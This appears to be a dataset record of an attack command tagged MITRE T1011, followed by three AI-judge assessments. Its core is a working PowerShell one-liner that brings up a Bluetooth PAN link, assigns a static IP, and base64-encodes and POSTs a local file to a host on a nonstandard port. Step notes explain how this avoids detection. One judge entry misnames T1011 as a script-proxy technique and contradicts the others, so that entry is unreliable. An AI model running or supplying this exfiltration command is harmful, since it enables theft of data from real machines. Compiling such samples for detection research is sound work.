command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 172.27.45.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\Public\Pictures\img1.png')); $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'http://172.27.45.1:52873/u' -Method POST -Body $body -UseBasicParsing -Headers @{ 'X-T'='b' } | Out-Null
explanation: Uses Bluetooth PAN with a static IP and exfiltrates data via an HTTP POST to a custom port reachable only over the Bluetooth link (T1011).
rationale_steps: Activate NAP over Bluetooth as the alternate network medium.
Assign a restricted /30 IP on the Bluetooth interface with netsh.
Use HTTP on a high, nonstandard port to minimize detection.
Ensure destination is on the Bluetooth-only subnet to force egress via Bluetooth.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax including variable assignments, pipeline operations, and proper method calls.
llm_judgments.semantic_justification: The command fully implements the claimed exfiltration technique by establishing a Bluetooth PAN connection with static IP addressing, then encoding a file as base64 and exfiltrating it via HTTP POST to a specific endpoint only accessible through the Bluetooth link.

llm_judgments.syntactic_justification: The command is perfectly well-formed, with correct PowerShell syntax for variable assignments, external command execution, cmdlet usage, and argument parsing.
llm_judgments.semantic_justification: The command directly executes a binary and PowerShell cmdlets/utilities, entirely failing to demonstrate the System Script Proxy Execution (T1011) technique as claimed in the explanation, which involves abusing trusted system scripts.

llm_judgments.syntactic_justification: PowerShell command is well-formed with balanced quotes, valid separators, and properly structured cmdlets, variables, and arguments.
llm_judgments.semantic_justification: It plausibly connects to a Bluetooth PAN, assigns a static IP, base64-encodes a file, and exfiltrates via HTTP POST to the peer, but static IP changes typically require admin rights and adapter discovery may return null, reducing reliability.
